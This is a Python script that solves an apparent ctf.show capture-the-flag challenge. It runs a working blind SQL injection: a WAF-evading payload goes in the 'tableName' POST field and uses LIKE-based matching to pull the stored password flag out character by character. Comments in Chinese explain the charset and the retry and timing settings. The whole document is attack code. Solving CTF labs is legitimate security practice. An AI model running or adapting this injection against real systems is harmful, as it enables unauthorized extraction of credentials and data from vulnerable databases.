import requests
import time

url = "http://80e1630e-08f6-418c-8d1e-8927f98e180e.challenge.ctf.show/select-waf.php"
#因为是uuid所以最多只到f -是uuid连接符 }是ctfshow闭合的部分
charset = "0123456789abcdef}-_"
flag = "ctfshow{"
timeout = 2  # 精确控制超时
retry_limit = 3  # 失败重试次数
delay = 0.1  # 每次请求间隔


def safe_request(payload):
    for _ in range(retry_limit):
        try:
            r = requests.post(url, data={"tableName": payload}, timeout=timeout)
            if r.status_code == 200:
                return "$user_count = 1" in r.text
        except:
            time.sleep(delay)
    return False


while True:
    found = False
    for c in charset:
        payload = f"(ctfshow_user)where(pass)like'{flag + c}%'"
        if safe_request(payload):
            flag += c
            print(f"\rCurrent flag: {flag}", end="", flush=True)
            if c == "}":
                print(f"\nFinal flag: {flag}")
                exit()
            found = True
            break  # 找到后立即进入下一轮
        time.sleep(delay)  # 避免高频请求

    if not found:
        print("\nNo more characters matched!")
        exit()